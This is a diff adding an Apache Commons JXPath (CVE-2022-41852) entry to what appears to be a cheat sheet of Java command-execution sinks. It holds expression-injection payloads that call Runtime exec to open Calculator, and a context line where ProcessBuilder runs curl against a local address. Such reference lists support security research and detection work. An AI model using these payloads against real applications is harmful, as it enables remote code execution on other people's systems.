@@ -329,6 +329,11 @@ engine.eval("var x=new java.lang.ProcessBuilder; x.command(\"curl\",\"http://127
 - UNIXProcess/ProcessImpl
 
 ### Expression Language
+- Apache Commons Jxpath <= 1.3(CVE-2022-41852)
+```java
+JXPathContext context = JXPathContext.newContext(null);
+context.getValue("exec(java.lang.Runtime.getRuntime(),'open -na Calculator')");
+```
 - Apache Common Text(prior to 1.10.0)
 ```java
 StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
